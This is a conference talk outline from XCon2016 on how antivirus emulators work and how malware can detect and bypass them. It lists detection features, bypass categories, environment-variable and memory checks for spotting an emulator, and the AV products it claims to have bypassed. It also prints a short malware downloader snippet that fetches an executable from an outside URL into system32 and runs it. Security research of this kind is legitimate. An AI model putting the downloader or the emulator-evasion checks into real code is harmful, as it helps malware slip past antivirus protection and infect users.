# Advanced Exploitation Techniques: Breaking AV-Emulator

**Presented at XCon2016 by nEINEI**

## About the Presenter
- **nEINEI**
  - Security researcher, software developer, and reverse engineer.
  - Website: [http://www.vxjump.net](http://www.vxjump.net)
  - Research Interests:
    - Vulnerability analysis and advanced exploitation techniques
    - Network Intrusion Prevention Systems (NIPS) and Host-based Intrusion Prevention Systems (HIPS)
    - Complexity viruses, reverse engineering, and advanced threats

## Agenda
1. **AV-Emulator Architecture and Implementation**
   - Background
   - Detection Techniques
   - Bypassing Methods
2. **Advanced Techniques for AV-Emulator Bypass**
   - Process Stack Information Inspection
   - C++ Advanced Syntactic Features
   - Randomized Conditional Branch Generation
   - Return-Oriented Programming (ROP) Simulation
   - DLL Forwarding
   - Exploiting Windows Memory Heap Management
3. **Mitigation Strategies for AV-Emulator Bypass**

## AV-Emulator Architecture and Implementation

### Background
- **Evolution of Virus Polymorphism and Metamorphism**
  - Complex PE packers
  - Malicious code behavior analysis

### Components
- **Host Environment**
  - Decryption
  - Poly Engine
  - Virus
  - RAM

### AV-Emulator vs. PE Unpacker
- **Is it a PE Unpacker?**
  - No, AV-Emulators are more than simple instruction simulators. They simulate entire operating systems and hardware environments.

### Implementation Details
- **CPU Simulation**
  - Instruction simulation (used in most AV-emulators)
  - Dynamic translation (e.g., QEMU)
  - Real environment execution (isolated space)

- **Simulated Instruction Set**
  - Generic instructions
  - FPU
  - 3D Now (limited support)

- **Memory Addressing Cache**
  - Registers recent memory accesses

- **CPU Exceptions**
  - TF (Trap Flag)
  - Int3, int1, int n
  - Non-existent page
  - Privileged instruction
  - Division by zero
  - Dx register single-step exception

- **Hardware Simulation**
  - Memory, NIC, HDD
  - Allocation of memory blocks to simulate hardware

- **PE Loader Simulation**
  - Mapping PE files to memory
  - PEB, TEB

- **API Simulation**
  - IAT (Import Address Table)
  - Dynamic loading

- **Windows GUI Simulation**
  - Simple thread scheduler
  - Message notification

### Additional Emulators
- **Script-Emulator & Boot-Emulator (Kaspersky)**
  - SWF vulnerability detection based on virtual stack machine
  - [Link to USPTO Document](http://pdfpiw.uspto.gov/.piw?PageNum=0&docid=09396334)

- **Bitdefender B-HAVE**
  - Virtual Machine for BAT/CMD scripts
  - VB script emulator
  - Virtual Machine for executable files (PE, MZ, COM, SYS, Boot Images)
  - [Link to Bitdefender Antivirus Technology PDF](http://www.bitdefender.com/files/Main/file/BitDefender_Antivirus_Technology.pdf)

### Automatic Detection of Packers
- **Methods**
  - Inspect compiler information
  - API instruction sequence
  - Track critical API calls and scan compiler signatures

### AV-Emulator Detection Technologies
- **Critical API Calls**
- **Malformed PE Files**
- **Malware API Sequences**
- **Dynamic Analysis of API Parameters**
- **Illegal Memory Access Requests**
- **Illegal File Path Requests**
- **Illegal Registry Path Requests**

### Bypassing AV-Emulators
- **Timing Attack**
- **Garbage Instruction Execution**
- **Parent Process Detection**
- **Condition Manipulation**
- **Non-simulated Instructions**
- **Address Information Leakage**

### Example: Basic Malware Downloader Function
```c
_url db 'http://vxjump.net/mal.exe',0
_mal db 'c:\\windows\\system32\\mal.exe',0

virus_run proc
    invoke URLDownloadToFile, 0, _url, _file, 0, 0
    invoke ShellExecute, 0, 0, _mal, 0, 0, SW_SHOW
    Invoke ExitProcess, 0
virus_run endp

start:
    call virus_run
```

### Process Stack Information Inspection
- **Inspecting at 0x10000**
  - Environment variable information stored at 0x10000 on WinXP
  - Bypass AV-emulator by checking for "00 00 00 00..."

### Fetching Environment Variable Address
- **GetEnvironmentStrings()**
  - Search for the file path of the current executable
  - If no such information is found, the code is likely running in an AV-Emulator

### Bypassed AV-Emulators
- Kaspersky KIS 2016
- Norman Suite 11
- Bitdefender Anti-virus 2016
- ESET Smart Security 8
- VBA32

This document provides a comprehensive overview of AV-Emulator architecture, implementation, and advanced techniques for bypassing these emulators.